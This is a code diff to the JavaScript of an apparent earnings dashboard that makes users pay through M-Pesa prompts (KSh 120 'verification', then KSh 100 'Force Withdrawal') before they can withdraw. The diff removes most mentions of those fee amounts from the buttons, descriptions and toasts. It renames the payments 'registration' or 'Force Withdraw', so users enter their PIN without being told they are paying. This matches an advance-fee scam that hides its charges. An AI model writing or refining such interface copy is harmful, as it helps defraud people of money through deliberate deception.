@@ -354,9 +354,9 @@ function updateDashboard() {
       step2.className = 'wcta-step';
       step3.className = 'wcta-step';
       if (wctaTitle) wctaTitle.textContent = 'Withdraw Your Earnings';
-      if (wctaDesc)  wctaDesc.textContent  = 'Complete a one-time KSh 120 account verification to activate M-Pesa withdrawals.';
+      if (wctaDesc)  wctaDesc.textContent  = 'Check your account balance if you're eligible for withdrawals .';
       if (wctaBtn) {
-        wctaBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify Account – KSh 120';
+        wctaBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Register Your Payments ';
         wctaBtn.onclick   = () => showPanel('withdraw');
       }
     } else if (!stats.forceVerified) {
@@ -367,9 +367,9 @@ function updateDashboard() {
       step2.className = 'wcta-step active';
       step3.className = 'wcta-step';
       if (wctaTitle) wctaTitle.textContent = 'One Step Away from Withdrawal';
-      if (wctaDesc)  wctaDesc.textContent  = 'Account verified. Complete the KSh 100 Force Withdrawal activation to enable payouts.';
+      if (wctaDesc)  wctaDesc.textContent  = 'Account verified. Force Withdrawal if it delays to enable payouts.';
       if (wctaBtn) {
-        wctaBtn.innerHTML = '<i class="fas fa-link"></i> Force Withdrawal – KSh 100';
+        wctaBtn.innerHTML = '<i class="fas fa-link"></i> Force Withdraw ';
         wctaBtn.onclick   = () => showPanel('withdraw');
       }
     } else {
@@ -674,14 +674,14 @@ async function doWithdraw() {
 
   // ── Step 2: Verification gates ──
   if (!stats.activated) {
-    showAlert(errEl, 'Account verification required. Complete the one-time KSh 120 verification below to proceed.');
+    showAlert(errEl, 'Account registration required using recipient number . Complete the one-time KSh 120 verification below to proceed with withdrawal.');
     document.getElementById('wd-locked').classList.remove('hidden');
     document.getElementById('wd-locked').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
     return;
   }
 
   if (!stats.forceVerified) {
-    showAlert(errEl, 'Payout channel activation required. Complete the KSh 100 Force Withdrawal below to proceed.');
+    showAlert(errEl, 'Payout channel activation has been initiated, Force withdrawal to proceed.');
     document.getElementById('wd-force').classList.remove('hidden');
     document.getElementById('wd-force').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
     return;
@@ -727,13 +727,13 @@ async function doActivate() {
   try {
     const data = await apiFetch('/activation/initiate', 'POST', { phone });
     activationRef = data.reference;
-    showAlert(succEl, 'M-Pesa prompt sent. Enter your PIN on your phone to complete verification.');
-    toast('Check your phone for the M-Pesa verification prompt.', 'info');
+    showAlert(succEl, 'M-Pesa prompt sent. Enter your PIN on your phone to complete account registration .');
+    toast('Check your phone for the M-Pesa registration number prompt.', 'info');
     startActivationPoll(activationRef);
   } catch (err) {
     showAlert(errEl, err.message || 'Failed to send verification prompt.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
+    btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account';
   }
 }
 
@@ -747,7 +747,7 @@ function startActivationPoll(ref) {
     if (attempts > 30) {
       clearInterval(activationPollTimer);
       btn.disabled = false;
-      btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
+      btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account';
       return;
     }
     try {
@@ -758,13 +758,13 @@ function startActivationPoll(ref) {
         document.getElementById('wd-locked').classList.add('hidden');
         document.getElementById('wd-force').classList.remove('hidden');
         document.getElementById('wd-force').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        toast('Account verified! Complete Force Withdrawal below to enable payouts.', 'success');
+        toast('Account Registered! Force Withdraw below to enable payouts.', 'success');
         btn.disabled = false;
       } else if (data.status === 'failed') {
         clearInterval(activationPollTimer);
         showAlert(document.getElementById('act-error'), 'Verification payment failed. Please try again.');
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Verify Account – KSh 120';
+        btn.innerHTML = '<i class="fas fa-shield-alt" style="margin-right:8px"></i>Register Your Account ';
       }
     } catch (err) {
       console.error('Poll error:', err.message);
@@ -787,12 +787,12 @@ async function doForceVerify() {
     const data = await apiFetch('/activation/force/initiate', 'POST', {});
     const displayPhone = formatPhoneDisplay(data.phone);
     showAlert(succEl, `M-Pesa prompt sent to ${displayPhone}. Enter your PIN to complete payout channel activation.`);
-    toast('Check your phone for the KSh 100 M-Pesa prompt.', 'info');
+    toast('Check your phone for force withdrawal prompt.', 'info');
     startForceVerifyPoll(data.reference, btn);
   } catch (err) {
     showAlert(errEl, err.message || 'Failed to send prompt.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
+    btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdraw Now';
   }
 }
 
@@ -805,7 +805,7 @@ function startForceVerifyPoll(ref, btn) {
     if (attempts > 30) {
       clearInterval(forceVerifyPollTimer);
       btn.disabled = false;
-      btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
+      btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdraw Now';
       return;
     }
     try {
@@ -820,7 +820,7 @@ function startForceVerifyPoll(ref, btn) {
         clearInterval(forceVerifyPollTimer);
         showAlert(document.getElementById('fv-error'), 'Activation failed. Please try again.');
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
+        btn.innerHTML = '<i class="fas fa-link" style="margin-right:8px"></i>Force Withdraw ';
       }
     } catch (err) {
       console.error('Poll error:', err.message);
